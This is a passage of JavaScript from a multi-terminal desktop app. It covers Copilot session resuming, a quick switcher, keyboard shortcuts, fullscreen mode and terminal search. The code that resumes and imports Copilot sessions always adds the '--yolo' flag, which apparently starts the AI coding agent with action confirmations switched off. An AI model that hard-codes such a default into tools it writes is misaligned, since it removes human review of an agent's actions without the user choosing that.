    more.addEventListener("click", () => {
      copilotResume.visibleLimit += COPILOT_SESSION_PAGE_SIZE;
      renderCopilotSessions();
    });
    elements.copilotResumeList.append(more);
  }

  if (copilotResume.sessions.length > 0) {
    elements.copilotResumeStatus.textContent = query
      ? `${shown.length} shown, ${filtered.length} matching, ${copilotResume.sessions.length} total`
      : `${shown.length} of ${copilotResume.sessions.length} resumable session${copilotResume.sessions.length === 1 ? "" : "s"}`;
  }
}

function powerShellLiteral(value) {
  return `'${String(value).replace(/'/g, "''")}'`;
}

function openCopilotSessionTerminal(session, command, cwd = session.cwd) {
  return addTerminal({
    reveal: true,
    runStartup: true,
    shell: "pwsh",
    cwd: cwd || undefined,
    title: `Copilot \u00b7 ${copilotSessionTitle(session)}`,
    pendingCommand: command
  });
}

async function resumeCopilotSession(session) {
  const id = String(session?.id || "");
  const terminal = state.terminals.get(copilotResume.terminalId);
  if (!COPILOT_RESUME_ID_PATTERN.test(id) || (!copilotResume.newTerminal && !terminal)) {
    toast("That terminal or Copilot session is no longer available", "warn", 2400);
    return false;
  }
  if (copilotResume.newTerminal && session.source === "cli") {
    closeCopilotResume();
    openCopilotSessionTerminal(session, `copilot --resume=${id} --yolo`);
    return true;
  }
  if (copilotResume.newTerminal) {
    const generation = copilotResume.generation;
    const response = await requestBridge({
      type: "prepareCopilotSessionContext",
      key: session.key,
      maxContextKb: Number(state.settings.copilotImportContextKb)
    }, { timeout: 120000 });
    if (generation !== copilotResume.generation) return false;
    if (!response?.contextPath || response.error) {
      toast(response?.error || "Could not import that Copilot session", "error", 3200);
      return false;
    }
    const source = copilotSourceLabel(session.source);
    const prompt = `Continue the imported ${source} Copilot session. Read the context file at ${response.contextPath} first, continue from where it stopped, and ask what to do next if the final task is unclear.`;
    closeCopilotResume();
    openCopilotSessionTerminal(session, `copilot --yolo -i ${powerShellLiteral(prompt)}`, response.cwd || session.cwd);
    return true;
  }
  closeCopilotResume();
  setAwaitingInput(terminal, false);
  sendBridge({ type: "input", id: terminal.id, data: `copilot --resume=${id} --yolo\r` });
  window.requestAnimationFrame(() => terminal.term.focus());
  return true;
}

/* ---------------- Terminal quick switcher (Alt+Q) --------------- */

// Every visible row gets a jump key: 1-9 first, then a-z, then nothing. Keys are
// assigned over the *filtered* list, so they stay dense as you type.
const QUICK_SWITCH_KEYS = "123456789abcdefghijklmnopqrstuvwxyz";
const quickSwitch = { open: false, index: 0, items: [] };

function quickSwitchKeyFor(index) {
  return index < QUICK_SWITCH_KEYS.length ? QUICK_SWITCH_KEYS[index] : null;
}

// Builds the searchable row list. Terminals from every page are included so the
// switcher can cross pages, which is the main reason it exists.
function quickSwitchCandidates(rawQuery) {
  const query = normalizeSearchText(rawQuery || "");
  const rows = [...state.terminals.values()].map((terminal) => ({
    id: terminal.id,
    title: terminal.titleInput.value,
    pageId: terminal.pageId,
    page: pageName(terminal.pageId),
    cwd: terminal.cwd || "",
    status: terminal.status || ""
  }));
  if (!query) return rows;
  return rows.filter((row) =>
    normalizeSearchText(`${row.title} ${row.page} ${row.cwd}`).includes(query)
  );
}

function openQuickSwitch() {
  if (state.terminals.size === 0) {
    toast("No terminals open", "info", 1600);
    return;
  }
  closePalette();
  quickSwitch.open = true;
  quickSwitch.index = 0;
  elements.quickSwitchOverlay.hidden = false;
  window.requestAnimationFrame(() => elements.quickSwitchOverlay.classList.add("is-open"));
  elements.quickSwitchInput.value = "";
  renderQuickSwitch();
  elements.quickSwitchInput.focus();
}

function closeQuickSwitch(refocus = true) {
  if (!quickSwitch.open) return;
  quickSwitch.open = false;
  elements.quickSwitchOverlay.classList.remove("is-open");
  window.setTimeout(() => {
    elements.quickSwitchOverlay.hidden = true;
  }, 150);
  if (refocus && state.activeId) {
    state.terminals.get(state.activeId)?.term.focus();
  }
}

function renderQuickSwitch() {
  if (!quickSwitch.open || !elements.quickSwitchList) return;

  quickSwitch.items = quickSwitchCandidates(elements.quickSwitchInput.value);
  quickSwitch.index = Math.min(quickSwitch.index, Math.max(0, quickSwitch.items.length - 1));

  const list = elements.quickSwitchList;
  list.textContent = "";
  if (quickSwitch.items.length === 0) {
    const empty = document.createElement("li");
    empty.className = "palette-empty";
    empty.textContent = "No matching terminals";
    list.append(empty);
    return;
  }

  const multiPage = state.pages.length > 1;
  quickSwitch.items.forEach((row, index) => {
    const li = document.createElement("li");
    li.className = "palette-item quick-item";
    li.dataset.index = index;
    li.dataset.id = row.id;
    li.setAttribute("role", "option");
    li.setAttribute("aria-selected", String(index === quickSwitch.index));

    const key = quickSwitchKeyFor(index);
    const badge = document.createElement("span");
    badge.className = key ? "quick-key" : "quick-key is-empty";
    badge.textContent = key ? key.toUpperCase() : "";
    if (key) badge.title = `Alt+${key.toUpperCase()}`;
    li.append(badge);

    const label = document.createElement("span");
    label.className = "quick-title";
    label.textContent = row.title;
    li.append(label);

    if (multiPage) {
      const page = document.createElement("span");
      page.className = "quick-page";
      page.textContent = row.page;
      li.append(page);
    }

    list.append(li);
  });
}

function moveQuickSwitchSelection(direction) {
  if (quickSwitch.items.length === 0) return;
  quickSwitch.index = (quickSwitch.index + direction + quickSwitch.items.length) % quickSwitch.items.length;
  const nodes = elements.quickSwitchList.querySelectorAll(".quick-item");
  nodes.forEach((node, index) => node.setAttribute("aria-selected", String(index === quickSwitch.index)));
  nodes[quickSwitch.index]?.scrollIntoView({ block: "nearest" });
}

function runQuickSwitchSelection(index = quickSwitch.index) {
  const row = quickSwitch.items[index];
  if (!row) return;
  closeQuickSwitch(false);
  window.setTimeout(() => setActiveTerminalAndReveal(row.id), 60);
}

function bindQuickSwitch() {
  if (!elements.quickSwitchOverlay) return;

  elements.quickSwitchInput.addEventListener("input", () => renderQuickSwitch());

  elements.quickSwitchInput.addEventListener("keydown", (event) => {
    // Alt+<key> jumps straight to a row. Alt is already held coming from Alt+Q,
    // and keeping the plain keys free is what lets the box stay searchable.
    if (event.altKey && !event.ctrlKey && !event.metaKey) {
      const index = QUICK_SWITCH_KEYS.indexOf(event.key.toLowerCase());
      if (index !== -1 && index < quickSwitch.items.length) {
        event.preventDefault();
        runQuickSwitchSelection(index);
        return;
      }
    }
    if (event.key === "ArrowDown") {
      event.preventDefault();
      moveQuickSwitchSelection(1);
    } else if (event.key === "ArrowUp") {
      event.preventDefault();
      moveQuickSwitchSelection(-1);
    } else if (event.key === "Enter") {
      event.preventDefault();
      runQuickSwitchSelection();
    } else if (event.key === "Escape") {
      event.preventDefault();
      closeQuickSwitch();
    }
  });

  elements.quickSwitchOverlay.addEventListener("pointerdown", (event) => {
    if (event.target === elements.quickSwitchOverlay) closeQuickSwitch();
  });

  elements.quickSwitchList.addEventListener("click", (event) => {
    const item = event.target.closest(".quick-item");
    if (!item) return;
    runQuickSwitchSelection(Number(item.dataset.index));
  });
}

/* ---------------- Global keyboard shortcuts --------------- */

function handleShortcutsOverlayKey(event) {
  if (event.key === "Escape") {
    event.preventDefault();
    closeShortcuts();
  }
}

function dismissUpdateDialogFromKey(event) {
  event.preventDefault();
  dismissUpdateDialog();
}

function bindGlobalShortcuts() {
  window.addEventListener("keydown", (event) => {
    const key = event.key.toLowerCase();

    if (event.key === "F11" && !event.ctrlKey && !event.altKey && !event.metaKey && !event.shiftKey) {
      event.preventDefault();
      toggleFullscreenFocus();
      return;
    }

    if (fullscreenFocus.active && event.key === "Escape") {
      event.preventDefault();
      event.stopImmediatePropagation();
      exitFullscreenFocus();
      return;
    }

    if (elements.updateConsentOverlay && !elements.updateConsentOverlay.hidden) {
      if (event.key === "Escape") {
        event.preventDefault();
        declineAutomaticUpdateChecks();
      }
      return;
    }

    if (elements.pageCloseOverlay && !elements.pageCloseOverlay.hidden) {
      if (event.key === "Escape") {
        event.preventDefault();
        closePageCloseConfirm();
      }
      return;
    }

    if (elements.statisticsOverlay && !elements.statisticsOverlay.hidden) {
      if (event.key === "Escape") {
        event.preventDefault();
        closeStatistics();
      }
      return;
    }

    if (elements.terminalArtifactsOverlay && !elements.terminalArtifactsOverlay.hidden) {
      if (event.key === "Escape") {
        event.preventDefault();
        closeTerminalArtifacts();
      }
      return;
    }

    if ((event.ctrlKey && event.shiftKey && key === "p") || event.key === "F1") {
      event.preventDefault();
      palette.open ? closePalette() : openPalette();
      return;
    }

    if (event.ctrlKey && !event.shiftKey && !event.altKey && !event.metaKey && key === "p") {
      event.preventDefault();
      addPage();
      return;
    }

    if (event.ctrlKey && event.key === "/") {
      event.preventDefault();
      elements.shortcutsOverlay.hidden ? openShortcuts() : closeShortcuts();
      return;
    }

    if (event.altKey && !event.ctrlKey && !event.metaKey && key === "q") {
      event.preventDefault();
      quickSwitch.open ? closeQuickSwitch() : openQuickSwitch();
      return;
    }

    if (!elements.shortcutsOverlay.hidden) {
      handleShortcutsOverlayKey(event);
      return;
    }

    if (elements.updateOverlay && !elements.updateOverlay.hidden) {
      if (event.key !== "Escape") return;
      dismissUpdateDialogFromKey(event);
      return;
    }

    if (!elements.aboutOverlay.hidden) {
      if (event.key === "Escape") {
        event.preventDefault();
        closeAbout();
      }
      return;
    }

    if (!elements.helpOverlay.hidden) {
      if (event.key === "Escape") {
        event.preventDefault();
        closeHelp();
      }
      return;
    }

    if (palette.open) return;
    // The switcher owns Alt+<key> while it is open; let its own handler see them.
    if (quickSwitch.open) return;

    if (event.key === "Escape") {
      if (state.findAll.active) {
        event.preventDefault();
        closeFindAll();
        return;
      }
      if (closeAnyFind()) {
        event.preventDefault();
        return;
      }
    }

    if (event.ctrlKey && !event.altKey && !event.metaKey && key === "t") {
      // Ctrl+T is the primary new-terminal chord; Ctrl+Shift+T also works.
      event.preventDefault();
      addTerminal({ reveal: true, runStartup: true });
    } else if (event.ctrlKey && event.shiftKey && key === "w") {
      event.preventDefault();
      if (state.activeId) removeTerminal(state.activeId);
    } else if (event.ctrlKey && key === "f" && !event.altKey && !event.metaKey) {
      event.preventDefault();
      if (event.shiftKey) openFindAll();
      else openFindActive();
    } else if (event.ctrlKey && event.shiftKey && key === "e") {
      event.preventDefault();
      if (blockFullscreenSurfaceAction("terminal search")) return;
      elements.terminalSearchInput.focus();
      elements.terminalSearchInput.select();
    } else if (event.ctrlKey && event.shiftKey && key === "r") {
      event.preventDefault();
      restartActiveSession();
    } else if (event.ctrlKey && event.shiftKey && key === "b") {
      event.preventDefault();
      toggleBroadcast();
    } else if (event.ctrlKey && event.shiftKey && key === "v") {
      event.preventDefault();
      pasteIntoActive();
    } else if (event.ctrlKey && event.shiftKey && key === "l") {
      event.preventDefault();
      clearActiveTerminal();
    } else if (event.ctrlKey && event.shiftKey && key === "x") {
      event.preventDefault();
      toggleZoomPane(state.activeId);
    } else if (event.ctrlKey && event.shiftKey && key === "c") {
      const active = state.activeId ? state.terminals.get(state.activeId) : null;
      if (active) {
        event.preventDefault();
        const selection = active.term.getSelection()
          || active.contextSelection
          || active.selectionSnapshot;
        copyTerminalOutput(active.id, selection || undefined);
      }
    } else if (event.ctrlKey && event.shiftKey && key === "q") {
      event.preventDefault();
      event.stopPropagation();
      dequeueNextTerminalCommand(state.activeId ? state.terminals.get(state.activeId) : null);
    } else if (event.ctrlKey && event.altKey && event.key === "ArrowRight") {
      event.preventDefault();
      cycleTerminal(1);
    } else if (event.ctrlKey && event.altKey && event.key === "ArrowLeft") {
      event.preventDefault();
      cycleTerminal(-1);
    } else if (event.ctrlKey && event.altKey && event.code === "Equal") {
      event.preventDefault();
      zoomActiveTerminalFont(1);
    } else if (event.ctrlKey && event.altKey && event.code === "Minus") {
      event.preventDefault();
      zoomActiveTerminalFont(-1);
    } else if (event.ctrlKey && event.altKey && (event.code === "Digit0" || event.code === "Numpad0")) {
      event.preventDefault();
      resetActiveTerminalFontZoom();
    } else if (event.ctrlKey && !event.altKey && event.key === "PageDown") {
      event.preventDefault();
      cyclePage(1);
    } else if (event.ctrlKey && !event.altKey && event.key === "PageUp") {
      event.preventDefault();
      cyclePage(-1);
    } else if (event.altKey && !event.ctrlKey && !event.metaKey && /^[1-9]$/.test(event.key)) {
      const page = state.pages[Number(event.key) - 1];
      if (page) {
        event.preventDefault();
        setActivePage(page.id);
      }
    } else if (event.ctrlKey && !event.altKey && (event.key === "=" || event.key === "+")) {
      event.preventDefault();
      fontZoom(1);
    } else if (event.ctrlKey && !event.altKey && event.key === "-") {
      event.preventDefault();
      fontZoom(-1);
    } else if (event.ctrlKey && !event.altKey && event.key === "0") {
      event.preventDefault();
      resetFontZoom();
    }
  }, true);
}

function captureFullscreenSurfaces() {
  return {
    activeElement: document.activeElement,
    activeId: state.activeId,
    broadcastOpen: !elements.broadcastBar.hidden,
    findAllOpen: !elements.findAllBar.hidden,
    logAutoscroll: logStore.autoscroll,
    logOpen: !elements.logPanel.hidden,
    logScrollTop: elements.logOutput.scrollTop,
    modalDialog: visibleModalDialog(),
    paneFindIds: [...state.terminals.values()]
      .filter((terminal) => terminal.findBar && !terminal.findBar.hidden)
      .map((terminal) => terminal.id)
  };
}

function visibleModalDialog() {
  return [...document.querySelectorAll('[role="dialog"], [role="alertdialog"]')]
    .find((dialog) => !dialog.closest("[hidden]")) || null;
}

function focusModalDialog(dialog, preferred) {
  const preferredIsValid = preferred instanceof HTMLElement
    && preferred.isConnected
    && dialog.contains(preferred);
  const target = preferredIsValid
    ? preferred
    : dialog.querySelector(
      'button:not([disabled]), input:not([disabled]), select:not([disabled]), '
      + 'textarea:not([disabled]), [tabindex]:not([tabindex="-1"])'
    );
  target?.focus();
}

function blockFullscreenSurfaceAction(label) {
  if (!fullscreenFocus.active) return false;
  toast(`Exit fullscreen focus mode to open ${label}.`, "info", 1800);
  state.terminals.get(state.activeId)?.term.focus();
  return true;
}

function setFullscreenSurfacesHidden(hidden, snapshot = fullscreenFocus.snapshot) {
  if (hidden) {
    elements.broadcastBar.hidden = true;
    elements.broadcastToggle.setAttribute("aria-pressed", "false");
    elements.findAllBar.hidden = true;
    updateLogPanelVisibility(false);
    for (const terminal of state.terminals.values()) {
      if (terminal.findBar) terminal.findBar.hidden = true;
    }
    return;
  }

  elements.broadcastBar.hidden = !snapshot.broadcastOpen;
  elements.broadcastToggle.setAttribute("aria-pressed", String(snapshot.broadcastOpen));
  elements.findAllBar.hidden = !snapshot.findAllOpen;
  updateLogPanelVisibility(snapshot.logOpen);
  if (snapshot.logOpen) {
    logStore.unseenError = false;
    if (elements.logToggleDot) elements.logToggleDot.hidden = true;
    logStore.autoscroll = snapshot.logAutoscroll;
    renderAllLogs();
    if (!snapshot.logAutoscroll) elements.logOutput.scrollTop = snapshot.logScrollTop;
  }
  const paneFindIds = new Set(snapshot.paneFindIds);
  for (const terminal of state.terminals.values()) {
    if (terminal.findBar) terminal.findBar.hidden = !paneFindIds.has(terminal.id);
  }
  const dialog = visibleModalDialog();
  if (dialog) {
    focusModalDialog(dialog, document.activeElement);
  } else if (
    state.activeId === snapshot.activeId
    && snapshot.activeElement?.isConnected
    && typeof snapshot.activeElement.focus === "function"
  ) {
    snapshot.activeElement.focus();
  } else {
    state.terminals.get(state.activeId)?.term.focus();
  }
}

function syncFullscreenFocus(enabled) {
  if (enabled === fullscreenFocus.active) return;
  if (enabled) {
    fullscreenFocus.snapshot = captureFullscreenSurfaces();
    fullscreenFocus.active = true;
    document.body.classList.add("fullscreen-focus");
    setFullscreenSurfacesHidden(true);
    if (fullscreenFocus.snapshot.modalDialog) {
      focusModalDialog(fullscreenFocus.snapshot.modalDialog, fullscreenFocus.snapshot.activeElement);
    } else {
      state.terminals.get(state.activeId)?.term.focus();
    }
  } else {
    const snapshot = fullscreenFocus.snapshot;
    fullscreenFocus.active = false;
    fullscreenFocus.snapshot = null;
    document.body.classList.remove("fullscreen-focus");
    if (snapshot) setFullscreenSurfacesHidden(false, snapshot);
  }
  fitAllTerminals();
}

function bindFullscreenEvents() {
  if (window.multiterm?.onFullscreenChange) {
    window.multiterm.onFullscreenChange(syncNativeFullscreen);
    return;
  }
  document.addEventListener("fullscreenchange", () => {
    syncNativeFullscreen(Boolean(document.fullscreenElement));
  });
}

function syncNativeFullscreen(enabled) {
  if (fullscreenFocus.scheduled > 0 && enabled !== fullscreenFocus.desired) return;
  fullscreenFocus.desired = enabled;
  syncFullscreenFocus(enabled);
}

async function requestNativeFullscreen(enabled) {
  if (window.multiterm?.setFullscreen) {
    return Boolean(await window.multiterm.setFullscreen(enabled));
  }
  if (enabled && document.documentElement.requestFullscreen) {
    await document.documentElement.requestFullscreen();
    return true;
  }
  if (!enabled && document.fullscreenElement && document.exitFullscreen) {
    await document.exitFullscreen();
  }
  return false;
}

function queueFullscreenRequest(enabled) {
  fullscreenFocus.scheduled += 1;
  const run = async () => {
    try {
      if (enabled !== fullscreenFocus.desired) return;
      const actual = await requestNativeFullscreen(enabled);
      if (enabled !== fullscreenFocus.desired) return;
      if (actual === enabled) {
        syncFullscreenFocus(actual);
        return;
      }
      fullscreenFocus.desired = actual;
      syncFullscreenFocus(actual);
      toast(enabled ? "Fullscreen unavailable." : "Could not leave fullscreen.", "error");
    } catch (error) {
      if (enabled !== fullscreenFocus.desired) return;
      if (enabled) {
        fullscreenFocus.desired = false;
        syncFullscreenFocus(false);
        toast(`Fullscreen unavailable: ${String(error?.message || error)}`, "error");
      } else {
        fullscreenFocus.desired = true;
        toast(`Could not leave fullscreen: ${String(error?.message || error)}`, "error");
      }
    } finally {
      fullscreenFocus.scheduled -= 1;
    }
  };
  fullscreenFocus.queue = fullscreenFocus.queue.then(run);
  return fullscreenFocus.queue;
}

function enterFullscreenFocus() {
  if (fullscreenFocus.desired && fullscreenFocus.active) return fullscreenFocus.queue;
  fullscreenFocus.desired = true;
  syncFullscreenFocus(true);
  return queueFullscreenRequest(true);
}

function exitFullscreenFocus() {
  if (!fullscreenFocus.desired && !fullscreenFocus.active) return fullscreenFocus.queue;
  fullscreenFocus.desired = false;
  return queueFullscreenRequest(false);
}

function toggleFullscreenFocus() {
  return fullscreenFocus.desired ? exitFullscreenFocus() : enterFullscreenFocus();
}

/* ---------------- Restart session --------------- */

function restartSession(id) {
  const terminal = state.terminals.get(id);
  if (!terminal) return;

  const meta = {
    title: terminal.titleInput.value,
    shell: terminal.shell,
    cwd: terminal.cwd,
    copilotCwd: terminal.copilotCwd,
    color: terminal.color,
    fontSizeOverride: terminal.fontSizeOverride,
    headerActionOverrides: { ...terminal.headerActionOverrides },
    notificationOverrides: { ...terminal.notificationOverrides },
    pageId: terminal.pageId,
    tmux: terminal.tmux
  };
  const anchor = terminal.pane.nextElementSibling;

  log.info("session", `Restarting session: ${meta.title}`, { id });
  removeTerminal(id);
  const next = addTerminal({
    reveal: true,
    title: meta.title,
    shell: meta.shell,
    cwd: meta.cwd,
    copilotCwd: meta.copilotCwd,
    color: meta.color,
    fontSizeOverride: meta.fontSizeOverride,
    headerActionOverrides: meta.headerActionOverrides,
    notificationOverrides: meta.notificationOverrides,
    pageId: meta.pageId,
    tmux: meta.tmux
  });
  if (next && anchor && anchor.parentElement === elements.host) {
    elements.host.insertBefore(next.pane, anchor);
  }
  toast("Session restarted", "info", 1600);
}

function restartActiveSession() {
  if (state.activeId) restartSession(state.activeId);
}

/* ---------------- In-terminal find --------------- */

const findDecorations = {
  decorations: {
    matchBackground: "#ffd75f",
    matchBorder: "#ffd75f",
    matchOverviewRuler: "#ffd75f",
    activeMatchBackground: "#f0b35a",
    activeMatchBorder: "#f0b35a",
    activeMatchColorOverviewRuler: "#f0b35a"
  }
};

function bindPaneFind(terminal) {
  const bar = terminal.pane.querySelector(".pane-find");
  if (!bar || !terminal.searchAddon) return;

  const input = bar.querySelector(".pane-find-input");
  const count = bar.querySelector(".pane-find-count");
  terminal.findBar = bar;
  terminal.findInput = input;
  terminal.findCount = count;

  terminal.searchAddon.onDidChangeResults((results) => {
    terminal.lastFindCount = results ? results.resultCount : 0;
    terminal.lastFindIndex = results ? results.resultIndex : -1;
    if (!results || results.resultCount === 0) {
      count.textContent = "0/0";
    } else {
      const current = results.resultIndex >= 0 ? results.resultIndex + 1 : 0;
      count.textContent = `${current}/${results.resultCount}`;
    }
    if (state.findAll.active || state.findAll.filter) {
      terminal.pane.classList.toggle("has-find-match", (terminal.lastFindCount || 0) > 0);
      if (state.findAll.filter && reconcileFilterVisibility(terminal)) scheduleTerminalSearchRefresh();
      refreshFindAllCount();
    }
  });

  input.addEventListener("input", () => {
    if (input.value) {
      terminal.searchAddon.findNext(input.value, { ...findDecorations, incremental: true });
    } else {
      terminal.searchAddon.clearDecorations();
      count.textContent = "0/0";
    }
  });

  input.addEventListener("keydown", (event) => {
    if (event.key === "Enter") {
      event.preventDefault();
      findNav(terminal, event.shiftKey ? -1 : 1);
    } else if (event.key === "Escape") {
      event.preventDefault();
      closeFind(terminal);
    }
  });

  bar.addEventListener("click", (event) => {
    const button = event.target.closest("button");
    if (!button) return;
    const kind = button.dataset.find;
    if (kind === "next") findNav(terminal, 1);
    else if (kind === "prev") findNav(terminal, -1);
    else if (kind === "close") closeFind(terminal);
  });
}

function openFind(terminal) {
  if (blockFullscreenSurfaceAction("terminal find")) return;
  if (!terminal?.searchAddon || !terminal.findBar) return;
  clearTerminalSearch();
  if (state.findAll.active) closeFindAll();
  setActiveTerminal(terminal.id);
  terminal.findBar.hidden = false;
  const selection = terminal.term.getSelection();
  if (selection && !selection.includes("\n")) {
    terminal.findInput.value = selection;
  }
  terminal.findInput.focus();
  terminal.findInput.select();
  if (terminal.findInput.value) {
    terminal.searchAddon.findNext(terminal.findInput.value, findDecorations);
  }
}

function openFindActive() {
  if (state.activeId) openFind(state.terminals.get(state.activeId));
}

function closeFind(terminal, { restoreFocus = true } = {}) {
  if (!terminal?.findBar) return;
  terminal.findBar.hidden = true;
  terminal.searchAddon?.clearDecorations();
  if (restoreFocus) terminal.term.focus();
}

function closeAnyFind(options) {
  for (const terminal of state.terminals.values()) {
    if (terminal.findBar && !terminal.findBar.hidden) {
      closeFind(terminal, options);
      return true;
    }
  }
  return false;
}

function findNav(terminal, direction) {
  if (!terminal?.searchAddon || !terminal.findInput.value) return;
  if (direction < 0) {
    terminal.searchAddon.findPrevious(terminal.findInput.value, findDecorations);
  } else {
    terminal.searchAddon.findNext(terminal.findInput.value, findDecorations);
  }
}

/* ---------------- Find across all terminals --------------- */

function orderedTerminals() {
  const seen = new Set();
  const ordered = [];
  for (const pane of elements.host.querySelectorAll(".terminal-pane")) {
    const terminal = state.terminals.get(pane.dataset.id);
    if (!terminal) continue;
    ordered.push(terminal);
    seen.add(terminal.id);
  }
  // Panes parked off-host (another page) still have buffers worth searching, so
  // the filter can reveal them instead of silently skipping them.
  for (const terminal of state.terminals.values()) {
    if (!seen.has(terminal.id)) ordered.push(terminal);
  }
  return ordered;
}

function bindFindAll() {
  const bar = elements.findAllBar;
  if (!bar) return;

  elements.findAllInput.addEventListener("input", () => {
    runFindAll(elements.findAllInput.value);
  });

  elements.findAllInput.addEventListener("keydown", (event) => {
    if (event.key === "Enter") {
      event.preventDefault();
      findAllNav(event.shiftKey ? -1 : 1);
    } else if (event.key === "Escape") {
      event.preventDefault();
      closeFindAll();
    }
  });

  bar.addEventListener("click", (event) => {
    const button = event.target.closest("button");
    if (!button) return;
    const kind = button.dataset.findall;
    if (kind === "next") findAllNav(1);
    else if (kind === "prev") findAllNav(-1);
    else if (kind === "close") closeFindAll();
  });
}

function openFindAll() {
  if (blockFullscreenSurfaceAction("find in all terminals")) return;
  if (!elements.findAllBar) return;
  // The per-pane find bar, find-all and the header filter share each terminal's
  // single search addon, so make them mutually exclusive.
  clearTerminalSearch();
  closeAnyFind();
  state.findAll.active = true;
  elements.findAllBar.hidden = false;

  const active = state.activeId ? state.terminals.get(state.activeId) : null;
  const selection = active?.term.getSelection();
  if (selection && !selection.includes("\n")) {
    elements.findAllInput.value = selection;
  }
  elements.findAllInput.focus();
  elements.findAllInput.select();
  runFindAll(elements.findAllInput.value);
}

function closeFindAll({ restoreFocus = true } = {}) {
  if (!state.findAll.active && elements.findAllBar?.hidden !== false) return;
  state.findAll.active = false;
  if (elements.findAllBar) elements.findAllBar.hidden = true;
  for (const terminal of state.terminals.values()) {
    terminal.searchAddon?.clearDecorations();
    terminal.pane.classList.remove("has-find-match");
  }
  state.findAll.order = [];
  state.findAll.ti = 0;
  state.findAll.li = -1;
  state.findAll.query = "";
  state.findAll.filter = false;
  const active = state.activeId ? state.terminals.get(state.activeId) : null;
  if (restoreFocus) active?.term.focus();
}

function runFindAll(rawQuery) {
  runSearchPass(rawQuery, { filter: false });
}

// Single highlight pass behind Ctrl+F's siblings: Ctrl+Shift+F calls it without
// a filter, the header search calls it with one. `filter` is the only
// difference — it hides panes that have nothing to show.
function runSearchPass(rawQuery, { filter = false, preserveNav = false } = {}) {
  const query = rawQuery || "";
  state.findAll.query = query;
  state.findAll.filter = filter && Boolean(query);

  if (!query) {
    for (const terminal of state.terminals.values()) {
      terminal.searchAddon?.clearDecorations();
      terminal.lastFindCount = 0;
      terminal.lastFindIndex = -1;
      terminal.pane.classList.remove("has-find-match");
      if (filter) setTerminalSearchHidden(terminal, false);
    }
    state.findAll.order = [];
    state.findAll.ti = 0;
    state.findAll.li = -1;
    refreshFindAllCount();
    return;
  }

  const order = [];
  for (const terminal of orderedTerminals()) {
    const matched = searchTerminalPane(terminal, query);
    terminal.pane.classList.toggle("has-find-match", matched);
    if (matched) order.push(terminal.id);
    if (!filter) continue;

    // A pane also survives the filter when its title/cwd/shell/status match,
    // which is how the header search has always narrowed down to a terminal by
    // name rather than by output.
    setTerminalSearchHidden(terminal, !(matched || terminalMetadataMatches(terminal, query)));
  }
  state.findAll.order = order;
  // A refresh triggered by live output keeps the user's place in the match
  // list; a new query always restarts from the top.
  if (!preserveNav || state.findAll.ti >= order.length) {
    state.findAll.ti = 0;
    state.findAll.li = -1;
  }
  refreshFindAllCount();
}

// Highlight every match in this pane without scrolling, then drop the
// active-match emphasis so nothing looks "current" until the user navigates.
// clearDecorations() first because the addon skips re-highlighting while the
// search term is unchanged — which would report a stale count for a pane whose
// buffer moved on, and would leave a just-revealed pane unpainted.
function searchTerminalPane(terminal, query) {
  if (!terminal.searchAddon) return false;
  terminal.searchAddon.clearDecorations();
  terminal.searchAddon.findNext(query, { ...findDecorations, incremental: true, noScroll: true });
  terminal.searchAddon.clearActiveDecoration();
  return (terminal.lastFindCount || 0) > 0;
}

// The search addon re-highlights itself ~200ms after new output lands, so its
// result event is the authoritative moment to reconsider whether a filtered
// pane still belongs on screen. Returns true when the visibility flipped.
function reconcileFilterVisibility(terminal) {
  const query = normalizeSearchText(state.findAll.query);
  if (!query) return false;
  const visible = (terminal.lastFindCount || 0) > 0 || terminalMetadataMatches(terminal, query);
  return setTerminalSearchHidden(terminal, !visible);
}

function findAllNav(direction) {
  const order = state.findAll.order;
  if (!order.length) return;
  const query = state.findAll.query;
  if (!query) return;

  let ti = state.findAll.ti >= order.length ? 0 : state.findAll.ti;
  let li = state.findAll.li;
  let switched = false;

  if (li < 0) {
    // First navigation: jump to the first (or last) match overall.
    switched = true;
    if (direction > 0) {
      ti = 0;
      li = 0;
    } else {
      ti = order.length - 1;
      li = Math.max(0, (state.terminals.get(order[ti])?.lastFindCount || 1) - 1);
    }
  } else {
    const curTerm = state.terminals.get(order[ti]);
    const curCount = curTerm ? (curTerm.lastFindCount || 0) : 0;
    if (direction > 0) {
      li += 1;
      if (li >= curCount) {
        switched = true;
        curTerm?.searchAddon?.clearActiveDecoration();
        ti = (ti + 1) % order.length;
        li = 0;
      }
    } else {
      li -= 1;
      if (li < 0) {
        switched = true;
        curTerm?.searchAddon?.clearActiveDecoration();
        ti = (ti - 1 + order.length) % order.length;
        li = Math.max(0, (state.terminals.get(order[ti])?.lastFindCount || 1) - 1);
      }
    }
  }

  state.findAll.ti = ti;
  state.findAll.li = li;

  const terminal = state.terminals.get(order[ti]);
  if (!terminal?.searchAddon) return;
  setActiveTerminal(terminal.id);
  terminal.pane.scrollIntoView({ block: "nearest", inline: "nearest" });
  // When entering a pane fresh, reset the selection so findNext/findPrevious
  // land deterministically on that pane's first/last match.
  if (switched) forgetTerminalSelection(terminal);
  if (direction > 0) {
    terminal.searchAddon.findNext(query, findDecorations);
  } else {
    terminal.searchAddon.findPrevious(query, findDecorations);
  }
  refreshFindAllCount();
}

function refreshFindAllCount() {
  const label = findAllCountLabel();
  if (elements.findAllCount) elements.findAllCount.textContent = label;
  // The header search only owns the counter while its filter is driving the
  // highlight session, so the find bars never leave a stale count behind it.
  if (elements.terminalSearchCount) {
    elements.terminalSearchCount.textContent = state.findAll.filter ? label : "";
  }
}

function findAllCountLabel() {
  const order = state.findAll.order;
  const panes = order.length;
  let total = 0;
  for (const id of order) total += state.terminals.get(id)?.lastFindCount || 0;

  if (!state.findAll.query) return "0/0";
  if (total === 0) return "No matches";

  let pos = 0;
  if (state.findAll.li >= 0 && state.findAll.ti < panes) {
    for (let i = 0; i < state.findAll.ti; i++) {
      pos += state.terminals.get(order[i])?.lastFindCount || 0;
    }
    pos += state.findAll.li + 1;
  }

  const paneLabel = `${panes} pane${panes === 1 ? "" : "s"}`;
  return pos > 0
    ? `${pos}/${total} · ${paneLabel}`
    : `${total} · ${paneLabel}`;
}

/* ---------------- Broadcast command bar --------------- */

function toggleBroadcast(force) {
  if (blockFullscreenSurfaceAction("broadcast commands")) return;
  const show = typeof force === "boolean" ? force : elements.broadcastBar.hidden;
  elements.broadcastBar.hidden = !show;
  elements.broadcastToggle.setAttribute("aria-pressed", String(show));
  if (show) {
    elements.broadcastInput.focus();
    elements.broadcastInput.select();
  } else if (state.activeId) {
    state.terminals.get(state.activeId)?.term.focus();
  }
}

function toggleBroadcastScope() {
  const next = { all: "active", active: "group", group: "all" };
  state.broadcastScope = next[state.broadcastScope] || "all";
